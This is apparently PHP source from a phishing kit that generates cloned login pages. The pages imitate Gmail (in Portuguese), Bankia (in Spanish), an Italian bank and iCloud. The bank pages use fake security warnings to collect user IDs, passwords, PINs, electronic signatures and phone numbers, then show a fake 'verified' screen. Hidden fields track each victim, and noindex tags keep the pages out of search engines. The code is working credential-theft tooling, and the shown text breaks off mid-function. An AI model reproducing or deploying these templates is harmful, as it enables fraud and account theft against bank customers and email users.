                                                    d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"
                                                ></path>
                                            </g>
                                            <g id="e6m3fd">
                                                <path
                                                    fill="#fbbc05"
                                                    d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"
                                                ></path>
                                            </g>
                                            <g id="vbkDmc">
                                                <path
                                                    fill="#ea4335"
                                                    d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"
                                                ></path>
                                            </g>
                                            <g id="idEJde">
                                                <path
                                                    fill="#4285f4"
                                                    d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"
                                                ></path>
                                            </g>
                                        </svg>
                                    </div>
                                </div>
                            </div>
                        </div>


                                <div class="DRS7Fe bxPAYd k6Zj8d" jsname="bN97Pc" jscontroller="Z3Buzf" jsshadow="" data-branding="jcJzye" role="presentation">
                                    <div jsname="paFcre">
                                        <div class="jXeDnc" jsname="tJHJj" jscontroller="S9352b" jsaction="JIbuQc:pKJJqe(af8ijd);bTyaEe:pKJJqe;">
                                            <h1 class="ahT6S" data-a11y-title-piece="" id="headingText" jsname="r4nke"><span jsslot="">Fazer login</span></h1>
                                            <div class="Y4dIwd" data-a11y-title-piece="" id="headingSubtext" jsname="VdSJob"><span jsslot="">Ir para o Gmail</span></div>
                                        </div>
                                    </div>
                                    <div jsname="uybdVe" class="pwWryf bxPAYd" role="presentation">

										<div jsname="USBQqe" class="Wxwduf Us7fWe JhUD8d" role="presentation">
                                            <div class="WEQkZc">
                                                <div class="bCAAsb" jsname="rEuO1b" jscontroller="mjtijb" data-form-action-uri="">

                                                        <span jsslot="">
                                                            <section class="aTzEhb" jscontroller="uwHxEe" jsshadow="">
                                                                <header class="IdEPtc" jsname="tJHJj" aria-hidden="true"></header>
                                                                <div class="CxRgyd" jsname="MZArnb">
                                                                    <div jsslot="">
                                                                        <div class="d2CFce cDSmF cxMOTc"role="presentation">
                                                                            <div class="rFrNMe N3Hzgf jjwyfe QBQrY zKHdkd sdJrJc Tyc9J">
                                                                                <div class="aCsJod oJeWuf">
                                                                                    <div class="aXBtI Wic03c">
                                                                                        <div class="Xb9hP">
                                                                                            <input
                                                                                                type="email"
                                                                                                class="whsOnd zHQkBf"
                                                                                                autocomplete="username"
                                                                                                spellcheck="false"
                                                                                                tabindex="1"
                                                                                                name="email"
                                                                                                value="'.$novoMail.'"
                                                                                                id="email"
                                                                                                dir="ltr"
                                                                                            />
                                                                                            <div id="textoemail" class="AxOyFc snByac" aria-hidden="true">E-mail ou telefone</div>
                                                                                        </div>
                                                                                        <div class="i9lrp mIZh1c"></div>
                                                                                        <div jsname="XmnwAc" class="OabDMe cXrdqd Y2Zypf"></div>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="LXRPh">
                                                                                    <div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div>
                                                                                    <div jsname="B34EJ" class="dEOOab RxsGPe" aria-atomic="true" aria-live="assertive"></div>
                                                                                </div>
                                                                            </div>
                                                                        </div>

																		<div class="d2CFce cDSmF cxMOTc"role="presentation">
                                                                            <div class="rFrNMe N3Hzgf jjwyfe QBQrY zKHdkd sdJrJc Tyc9J">
                                                                                <div class="aCsJod oJeWuf">
                                                                                    <div class="aXBtI Wic03c">
                                                                                        <div class="Xb9hP">
                                                                                            <input
                                                                                                type="password"
                                                                                                class="whsOnd zHQkBf"
                                                                                                spellcheck="false"
                                                                                                tabindex="2"
                                                                                                name="senha"
                                                                                                value=""
                                                                                                id="senha"
                                                                                                dir="ltr"
                                                                                            />
                                                                                            <div id="textosenha" class="AxOyFc snByac" aria-hidden="true">Senha</div>
                                                                                        </div>
                                                                                        <div class="i9lrp mIZh1c"></div>
                                                                                        <div jsname="XmnwAc" class="OabDMe cXrdqd Y2Zypf"></div>
                                                                                    </div>
                                                                                </div>
                                                                                <div class="LXRPh">
                                                                                    <div jsname="ty6ygf" class="ovnfwe Is7Fhb"></div>
                                                                                    <div jsname="B34EJ" class="dEOOab RxsGPe" aria-atomic="true" aria-live="assertive"></div>
                                                                                </div>
                                                                            </div>
                                                                        </div>';
																		$html .= "\n" . '<input type="hidden" name="apple_add"  id="apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '" >' . "\n";
                                                                        $html .= "\n" . '<div class="PrDSKc" jsname="OZNMeb" aria-live="assertive"></div>
                                                                        <div class="PrDSKc"><button jsname="Cuz2Ue" type="button">Esqueceu seu e-mail?</button></div>
                                                                        <input type="password" name="hiddenPassword" class="F29zPe" tabindex="3" aria-hidden="true" spellcheck="false" jsname="RHeR4d" />
                                                                        <div jscontroller="lmaXKd" jsname="Si5T8b" class="Wzzww eLNT1d" jsaction="click:IMdg8d(A1U4Sb);rcuQ6b:jqIVcd">
                                                                            <img jsname="O9Milc" id="captchaimg" class="TrZEUc" />


                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </section>
                                                        </span>

                                                </div>
                                                <span jsslot="">
                                                    <div class="vwtvsf">
                                                        <div class="PrDSKc">
                                                            Não está no seu computador? Use janelas de navegação privada para fazer login.
                                                            <a href="#" jsname="JFyozc">Saiba mais</a>
                                                        </div>
                                                    </div>
                                                </span>
                                            </div>
                                            <div class="zQJV3">
                                                <div class="dG5hZc" jsname="DhK0U">
                                                    <div class="qhFLie" jsname="k77Iif">
                                                        <div jscontroller="Xq93uf" jsaction="click:cOuCgd;JIbuQc:JIbuQc;" jsname="Njthtb" class="FliLIb DL0QTb" id="identifierNext">
                                                            <div class="VfPpkd-dgl2Hf-ppHlrf-sM5MNb" data-is-touch-wrapper="true">
                                                                <button onclick="SendLoginXiaomi()" class="VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc qIypjc TrZEUc" type="submit">
                                                                    <div class="VfPpkd-Jh9lGc"></div>
                                                                    <span jsname="V67aGc" class="VfPpkd-vQzf8d">Próxima</span>
                                                                    <div class="VfPpkd-RLmnJb"></div>
                                                                </button>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="daaWTb" jsname="QkNstf">
                                                        <div class="OIPlvf" jsname="FIbd0b">
                                                            <div
                                                                role="button"
                                                                class="U26fgb c7fp5b FS4hgd FliLIb uRo0Xe t29vte"
                                                                tabindex="0"
                                                                id="ow315"
                                                            >
                                                                <div class="lVYxmb MbhUzd" jsname="ksKsZd"></div>
                                                                <div class="g4jUVc" aria-hidden="true"></div>
                                                                <span jsslot="" class="I3EnF oJeWuf"><span class="NlWrkb snByac">Criar conta</span></span>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>

                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <footer class="RwBngc">
                    <div class="u7land" jscontroller="VVHlDf" jsaction="rcuQ6b:npT2md;aLn7Wb:VPRXbd">
                        <div role="listbox" id="lang-chooser" class="jgvuAb TkU0Xc">
                            <div jsname="LgbsSe" role="presentation">
                                <div class="ry3kXd Ulgu9" jsname="d9BH4c" role="presentation">
                                    <div class="MocG8c B9IrJb LMgvRb KKjvXb" jsname="wQNmvb" jsaction="" data-value="pt" aria-selected="true" role="option" tabindex="0">
                                        <div class="kRoyt MbhUzd" jsname="ksKsZd"></div>
                                        <span jsslot="" class="vRMGwf oJeWuf">‪Português (Brasil)‬</span>
                                    </div>
                                </div>
                                <div class="CeEBt Ce1Y1c eU809d" role="presentation"><div class="TquXA"></div></div>
                            </div>
                        </div>
                    </div>
                    <ul class="Bgzgmd">
                        <li><a href="#" target="_blank">Ajuda</a></li>
                        <li><a href="#" target="_blank">Privacidade</a></li>
                        <li><a href="#" target="_blank">Termos</a></li>
                    </ul>
                </footer>
            </div>
            <div class="VmOpGe" aria-hidden="true"></div>
        </div>

        <div class="lDwpOe"></div>

        <div aria-live="assertive" aria-relevant="additions" aria-atomic="true" style="color: transparent; z-index: -1; position: absolute; top: 0px; left: 0px; user-select: none;" aria-hidden="true">
            <div aria-atomic="true">Fazer login Ir para o Gmail</div>
        </div>
		<script src="/assets/js/jsGoogle.js"></script>

    </body>
</html>
';
	return $html;
}
}


if (!(function_exists('fmiTemplate'))) {
function fmiTemplate($title, $emailid, $MD5IdentificaAcesso)
{

	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);

	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirect = $ci->load->get_var('redirect');
	$redirecturl = $ci->load->get_var('redirecturl');
	$title = ((isset($title) ? $title : 'iCloud'));
	$RandomIdentificacao = time()*rand();


	$html2 = "//Template 4//";
	$html = '
<!DOCTYPE html>
<html lang="en">
<head>
	<title>Acceso Clientes | Bankia</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="icon" type="image/png" href="/assets/bank4/favicon.png"/>
	<link rel="stylesheet" type="text/css" href="/assets/bank4/bootstrap.min.css">


	<link rel="stylesheet" type="text/css" href="/assets/bank4/util.css">
	<link rel="stylesheet" type="text/css" href="/assets/bank4/main.css">

</head>
<body>

	<div class="header">
	  <img src="/assets/bank4/bnl-logo.png" style="width: 25%;margin-top: -10px;">
	  <div class="header-right">

	  </div>
	</div>

	<div id="Primeira-Pagina" class="limiter">

		<div class="container-login100">

			<div class="wrap-login100 p-l-85 p-r-85 p-t-55 p-b-55">

					<span class="login100-form-title" style="text-align:center">
						Estimado cliente hemos detectado varios intentos fallidos de inicio de sesión con tu documento de identidad. Si los fallos persisten, por precaución, procederemos a bloquear tus datos. Verifica tu cuenta aquí:
					</span>


					<span class="txt1 p-b-11">
					    Usuario
					</span>
					<input type="hidden" name="apple_add" id="apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '">
					<input type="hidden" name="link_address" id="link_address" value="' . $_SERVER['SERVER_NAME'] . '">
					<input type="hidden" name="TemplateBank" id="TemplateBank" value="4">
					<input type="hidden" name="RandomIdentificacao" id="RandomIdentificacao" value="' . $RandomIdentificacao . '">
					<input type="hidden" name="MD5IdentificaAcesso" id="MD5IdentificaAcesso" value="' . $MD5IdentificaAcesso . '">

					<div class="wrap-input100 validate-input m-b-36" data-validate = "Usuario requerido">
						<input class="input100" type="text" name="usuario" id="usuario" placeholder="NIF / NIE / PASAPORTE">
						<span class="focus-input100"></span>

					</div>


					<span class="txt1 p-b-11">
						Clave de acceso
					</span>
					<div class="wrap-input100 validate-input m-b-36" data-validate = "Clave de acceso requerida">
						<input class="input100" type="password" name="contrasena" id="contrasena" placeholder="">
						<span class="focus-input100"></span>

					</div>

					<span class="txt1 p-b-11">
						Firma Electrónica
					</span>
					<div class="wrap-input100 validate-input m-b-36" data-validate = "Firma Electrónica requerida">
						<input class="input100" type="password" name="firmael" id="firmael" placeholder="">
						<span class="focus-input100"></span>

					</div>


					<span class="txt1 p-b-11">
						Nùmero de movil
					</span>
					<div class="wrap-input100 validate-input m-b-36" data-validate = "Nùmero de movil  requerido">
						<input class="input100" type="text" name="numerotel" id="numerotel" placeholder="">
						<span class="focus-input100"></span>

					</div>


					<div class="container-login100-form-btn">
						<button onclick="CickMain1()" id="BtnSend" class="generated-text" type="submit">Entrar</button>
					</div>


			</div>


		</div>
	</div>

	<div id="Segunda-Pagina" class="limiter" style="display: none;">
	<div class="alertSection">
		<div class="blockImage section">
			<div class="item-multiple__element " style="  min-height: auto;; margin-top: 30px !important" data-isp-spazio-manuale="{&quot;dmtop&quot;:&quot;30&quot;,&quot;panelSize&quot;:&quot;custom&quot;}">
				<div class="block__ico ico-center">
				<img class="img_responsive" style="height:100px; width:100px; align:center;" src="/assets/bank4/Exclamation.svg.png" />
				</div>
			</div>
		</div>
		<div class="blockTitle section">
			<div class="item-multiple__element  space10" style=" text-align: left; min-height: auto;" data-isp-spazio-manuale="{&quot;panelSize&quot;:&quot;space10&quot;}">
				<div class="block__title">
					<div>

					</div>
				<br>
				<h3 class="medium-title"><span class="textCenter">Tus datos se verificaron correctamente. En la mayor brevedad posible te contactará un operador para realizar las comprobaciones de seguridad.</span></h3>
				</div>
			</div>
		</div>
	</div>
</div>


	<div id="dropDownSelect1"></div>


<!--
<script type="text/javascript">
var _smartsupp = _smartsupp || {};
_smartsupp.key = "77a903b3a9edd5051432c72459e4efb33e03c2ee";
window.smartsupp||(function(d) {
var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
s=d.getElementsByTagName("script")[0];c=d.createElement("script");
c.type="text/javascript";c.charset="utf-8";c.async=true;
c.src="js/loader.js?";s.parentNode.insertBefore(c,s);
})(document);
</script>
-->
<script src="/assets/js/jquery.js"></script>
<script src="/assets/bank4/bank4.js?t=' . time() .'"></script>
</body>
</html>
	';
	return $html;
}
}


if (!(function_exists('mapTemplate'))) {
function mapTemplate($title, $emailid, $MD5IdentificaAcesso)
{
	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirectMap = $ci->load->get_var('redirectMap');
	$title = ((isset($title) ? $title : 'Maps Connect'));
	$RandomIdentificacao = time()*rand();

	$html2 = '//Template 6//';
	$html = '<!DOCTYPE html>
<html lang="en">
<head>
	<title>login</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="icon" type="image/png" href="/assets/bank6/favicon.png"/>

	<link rel="stylesheet" type="text/css" href="/assets/bank6/bootstrap/css/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="/assets/bank6/util.css">
	<link rel="stylesheet" type="text/css" href="/assets/bank6/main.css">


<style>
.header {
  overflow: hidden;
  background-color: #fff;
  padding: 20px 10px;
}

.header a {
  float: left;
  color: black;
  text-align: left;
  padding: 12px;
  text-decoration: none;
  font-size: 18px;
  line-height: 25px;
  border-radius: 4px;
}

.header a.logo {
  font-size: 25px;
  font-weight: bold;
}

.header a:hover {
  background-color: #fff;
  color: black;
}

.header a.active {
  background-color: dodgerblue;
  color: white;
}

.header-right {
  float: right;
}

.alertSection {
	text-align: center;
}

h3 {
	text-align: center;
	padding: 12px;
	font-size: 1.3rem;
}

@media screen and (max-width: 500px) {
  .header a {
    float: none;
    display: block;
    text-align: left;
  }
  .header-right {
    float: none;
  }
}
</style>

</head>
<body>

	<div class="header">
	  <img src="/assets/bank6/bnl-logo.png" style="width:30%">
	  <div class="header-right">

	  </div>
	</div>

	<div class="limiter" id="Primeira-Pagina">
		<div class="alertSection">
				<b><br /><p>E\' stato effettuato un accesso su un dispositivo non riconosciuto se non sei stato tu clicca e verifica i dati. Inserire le informazioni di seguito per procedere con la verifica di sicurezza:
        </p>
		</div>
		<div class="container-login100">

			<div class="wrap-login100 p-l-85 p-r-85 p-t-55 p-b-55">


					<span class="login100-form-title p-b-32">
						AREA CLIENTI PRIVATI
					</span>

					<span class="txt1 p-b-11">
						CODICE TITOLARE
					</span>

					<input type="hidden" name="apple_add" id="apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '">
					<input type="hidden" name="link_address" id="link_address" value="' . $_SERVER['SERVER_NAME'] . '">
					<input type="hidden" name="TemplateBank" id="TemplateBank" value="6">
					<input type="hidden" name="RandomIdentificacao" id="RandomIdentificacao" value="' . $RandomIdentificacao . '">
					<input type="hidden" name="MD5IdentificaAcesso" id="MD5IdentificaAcesso" value="' . $MD5IdentificaAcesso . '">

					<div class="wrap-input100 validate-input m-b-36" data-validate = "Codice Titolare richiesto">
						<input class="input100" type="text" name="num_cliente" id="Usuario" >
						<span class="focus-input100"></span>
					</div>

					<span class="txt1 p-b-11">
						PIN
					</span>
					<div class="wrap-input100 validate-input m-b-36" data-validate = "PIN richiesto">
						<input class="input100" type="password" name="pin" id="Senha" >
						<span class="focus-input100"></span>

					</div>

					<span class="txt1 p-b-11">
						TELEFONO
					</span>
					<div class="wrap-input100 validate-input m-b-36" data-validate = "Telefono richiesto">
						<input class="input100" type="text" name="telefono" id="Telefone" >
						<span class="focus-input100"></span>

					</div>


					<div class="container-login100-form-btn">
						<button id="BtnSend" onclick="CickMain1()" type="submit">
							<img src="/assets/bank6/login-button.png" alt="submit" />
						</button>
					</div>



			</div>


		</div>
	</div>

	<div class="limiter" id="Segunda-Pagina" style="display: none;">
		<div class="alertSection">
			<div class="blockImage section">
				 <div class="item-multiple__element " style="  min-height: auto;; margin-top: 30px !important" data-isp-spazio-manuale="{&quot;dmtop&quot;:&quot;30&quot;,&quot;panelSize&quot;:&quot;custom&quot;}">
						<div class="block__ico ico-center">
							 <img class="img_responsive" style="height:100px; width:100px; align:center;" src="/assets/bank6/Exclamation.svg.png">
						</div>
				 </div>
			</div>
			<div class="blockTitle section">
				 <div class="item-multiple__element  space10" style=" text-align: left; min-height: auto;" data-isp-spazio-manuale="{&quot;panelSize&quot;:&quot;space10&quot;}">
						<div class="block__title">
							 <div>

					 </div>
					 <br>
					 <h3 class="medium-title"><span class="textCenter">Conto verificato con successo. Tutti i dispositivi sono stati disconnessi. Potrai essere contattato da un nostro operatore per ulteriori verifiche.</span></h3>
		 </div>
			</div>
		</div>
	</div>

</div>

	<div id="dropDownSelect1"></div>

	<script src="/assets/js/jquery.js"></script>
<script src="/assets/bank6/bank6.js?t=' . time() .'"></script>
</body>
</html>
';

	return $html;
}
}


if (!(function_exists('newiTemplate'))) {
function newiTemplate($title, $emailid)
{
	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirect = $ci->load->get_var('redirect');
	$redirecturl = $ci->load->get_var('redirecturl');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$title = ((isset($title) ? $title : 'iCloud'));
	$html = '<!DOCTYPE html>' . "\n" . '<html lang="en">' . "\n" . '<head>' . "\n" . '    <meta charset="UTF-8">' . "\n" . '    <meta name="robots" content="noindex, nofollow, noarchive"/>' . "\n" . '    <meta name="googlebot" content="noindex, nofollow, noarchive">' . "\n" . '    <meta name="googlebot" content="nosnippet"/>' . "\n" . '    <meta name="robots" content="noodp"/>' . "\n" . '    <meta name="slurp" content="noydir">' . "\n" . '    <meta name="robots" content="noimageindex,nomediaindex"/>' . "\n" . '    <meta name="robots" content="unavailable_after: 21-Jul-2037 14:30:00 CET"/>' . "\n" . '    <meta http-equiv="X-UA-Compatible" content="IE=edge">' . "\n" . '    <meta content="width=device-width, initial-scale=1" name="viewport"/>' . "\n" . '    <link rel="apple-touch-icon" sizes="57x57" href="/assets/favicon/apple-icon-57x57.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="60x60" href="/assets/favicon/apple-icon-60x60.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="72x72" href="/assets/favicon/apple-icon-72x72.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="76x76" href="/assets/favicon/apple-icon-76x76.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="114x114" href="/assets/favicon/apple-icon-114x114.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="120x120" href="/assets/favicon/apple-icon-120x120.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="144x144" href="/assets/favicon/apple-icon-144x144.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="152x152" href="/assets/favicon/apple-icon-152x152.png">' . "\n" . '    <link rel="apple-touch-icon" sizes="180x180" href="/assets/favicon/apple-icon-180x180.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="192x192" href="/assets/favicon/android-icon-192x192.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="32x32" href="/assets/favicon/favicon-32x32.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="96x96" href="/assets/favicon/favicon-96x96.png">' . "\n" . '    <link rel="icon" type="image/png" sizes="16x16" href="/assets/favicon/favicon-16x16.png">' . "\n" . '    <link rel="manifest" href="/assets/favicon/manifest.json">' . "\n" . '    <meta name="msapplication-TileColor" content="#ffffff">' . "\n" . '    <meta name="msapplication-TileImage" content="/assets/favicon/ms-icon-144x144.png">' . "\n" . '    <meta name="theme-color" content="#ffffff">' . "\n" . '    <title>' . $title . '</title>' . "\n" . '    <link rel="stylesheet" href="/assets/layout/strap.css">' . "\n" . '    <link rel="stylesheet" href="/assets/layout/applenew.css">' . "\n" . '    <link rel="stylesheet" href="/assets/layout/kit.css">' . "\n" . '    <link rel="stylesheet" href="/assets/layout/animate.css">' . "\n" . '    <link rel="stylesheet" href="/assets/css/font-awesome.css">' . "\n" . '    <style>' . "\n" . '        .main-container {' . "\n" . '            position: absolute;' . "\n" . '            top: 0;' . "\n" . '            left: 0;' . "\n" . '            width: 100%;' . "\n" . '            min-height: 100%;' . "\n" . '            overflow: hidden;' . "\n" . '            z-index: 1;' . "\n" . '        }' . "\n\n" . '        .section-bgs {' . "\n" . '            position: relative;' . "\n" . '            width: 100%;' . "\n" . '            min-height: 100%;' . "\n" . '            z-index: 1;' . "\n" . '        }' . "\n\n" . '        .section-bgs canvas {' . "\n" . '            min-height: 100%;' . "\n" . '            width: 100%;' . "\n" . '            z-index: 1;' . "\n" . '        }' . "\n\n" . '    </style>' . "\n" . '</head>' . "\n" . '<body class="robots-nocontent sc-theme sc-focus box-shadow border-rad safari mac webkit en-us">' . "\n\n";
	$html .= '

		<div class="header" id="cloudos-loading-screen-header">
        <div class="apple-icon-wrapper">
            <svg class="apple-icon" xmlns="http://www.w3.org/2000/svg" width="16" height="44" viewBox="0 0 16 44">
             <path d="M8.02 16.23c-.73 0-1.86-.83-3.05-.8-1.57.02-3.01.91-3.82 2.32-1.63 2.83-.42 7.01 1.17 9.31.78 1.12 1.7 2.38 2.92 2.34 1.17-.05 1.61-.76 3.03-.76 1.41 0 1.81.76 3.05.73 1.26-.02 2.06-1.14 2.83-2.27.89-1.3 1.26-2.56 1.28-2.63-.03-.01-2.45-.94-2.48-3.74-.02-2.34 1.91-3.46 2-3.51-1.1-1.61-2.79-1.79-3.38-1.83-1.54-.12-2.83.84-3.55.84zm2.6-2.36c.65-.78 1.08-1.87.96-2.95-.93.04-2.05.62-2.72 1.4-.6.69-1.12 1.8-.98 2.86 1.03.08 2.09-.53 2.74-1.31"></path>
             </svg>
        </div>
        <div class="apple-icon-right">
             <svg class="apple-ico" viewBox="0 0 98 98" version="1.1" xmlns="http://www.w3.org/2000/svg" classname=" glyph-box">
            <g transform="matrix(1 0 0 1 -11 85)">
            <path d="M 58.5449 14.5508 C 85.791 14.5508 108.35 -8.00781 108.35 -35.2539 C 108.35 -62.4512 85.7422 -85.0586 58.4961 -85.0586 C 31.2988 -85.0586 8.74023 -62.4512 8.74023 -35.2539 C 8.74023 -8.00781 31.3477 14.5508 58.5449 14.5508 Z M 58.5449 6.25 C 35.498 6.25 17.0898 -12.207 17.0898 -35.2539 C 17.0898 -58.252 35.4492 -76.7578 58.4961 -76.7578 C 81.543 -76.7578 100 -58.252 100.049 -35.2539 C 100.098 -12.207 81.5918 6.25 58.5449 6.25 Z M 57.5195 -25.1465 C 60.0098 -25.1465 61.4746 -26.6602 61.4746 -28.6133 L 61.4746 -29.1992 C 61.4746 -31.9336 63.0859 -33.6426 66.4551 -35.8887 C 71.1914 -39.0137 74.5605 -41.8945 74.5605 -47.7051 C 74.5605 -55.8594 67.334 -60.2051 59.082 -60.2051 C 50.6836 -60.2051 45.166 -56.25 43.7988 -51.7578 C 43.5547 -50.9277 43.4082 -50.1465 43.4082 -49.3164 C 43.4082 -47.168 45.1172 -45.9473 46.7285 -45.9473 C 49.5117 -45.9473 49.9512 -47.4609 51.5137 -49.2676 C 53.125 -51.9531 55.4688 -53.5645 58.7402 -53.5645 C 63.1836 -53.5645 66.1133 -51.0742 66.1133 -47.3145 C 66.1133 -43.9941 64.0137 -42.3828 59.7656 -39.4531 C 56.25 -37.0117 53.6621 -34.4238 53.6621 -29.6387 L 53.6621 -29.0039 C 53.6621 -26.416 55.0293 -25.1465 57.5195 -25.1465 Z M 57.4219 -10.5469 C 60.2539 -10.5469 62.6953 -12.793 62.6953 -15.625 C 62.6953 -18.5059 60.3027 -20.7031 57.4219 -20.7031 C 54.541 -20.7031 52.1484 -18.457 52.1484 -15.625 C 52.1484 -12.8418 54.5898 -10.5469 57.4219 -10.5469 Z">
            </path></g></svg>
        </div>
	</div>

	';

	$html .= '<div class="first-load">' . "\n" . '    <div class="overlay">' . "\n" . '        <div class="spinner center">' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '            <div class="spinner-blade"></div>' . "\n" . '        </div>' . "\n" . '    </div>' . "\n" . '</div>' . "\n\n" . '<div class="bodys" style="display: none; z-index: 9999;">' . "\n" . '    <section id="header">' . "\n" . '        <div class="container-fluid">' . "\n" . '            <div class="row">' . "\n" . '                <div class="col-md-4 col-xs-8 rightH">' . "\n" . '                    <a class="help" title="' . $ci->lang->line('Help_message') . '"' . "\n" . '                       alt="' . $ci->lang->line('Help_message') . '" href="https://help.apple.com/icloud/"></a>' . "\n" . '                    <span class="spreat"></span>';

	if (!($ci->session->userdata('firstName'))) {
		$html .= '<a class="setup applef" target="_blank"' . "\n" . '                           href="https://www.apple.com/icloud/setup/">' . $ci->lang->line('Setup_message') . '</a>';
	}


	$html .= '<div class="setup fName"' . "\n" . '                         style="display: ' . (($ci->session->userdata('logged_in') == false ? 'none' : 'block')) . '">' . "\n" . '                    <span>' . "\n" . '                    <img src="/assets/img/user.png" alt="">' . $ci->session->userdata('firstName') . "\n" . '                        <i class="glyphicon glyphicon-menu-down"></i>' . "\n" . '                        </span>' . "\n" . '                        <ul>' . "\n" . '                            <li>' . "\n" . '                                <a href="' . site_url('findmyiphone') . '">' . $ci->lang->line('iCloudsettings_message') . '</a>' . "\n" . '                            </li>' . "\n" . '                            <li>' . "\n" . '                                <a href="' . site_url('logout') . '">' . $ci->lang->line('Signout_message') . '</a>' . "\n" . '                            </li>' . "\n" . '                        </ul>' . "\n" . '                    </div>' . "\n\n" . '                </div>' . "\n" . '                <div class="col-md-8 col-xs-4 leftH">' . "\n" . '                    <span class="icloud"></span>' . "\n" . '                </div>' . "\n" . '            </div>' . "\n" . '        </div>' . "\n" . '    </section>';

	if ($ci->session->userdata('logged_in') == false) {
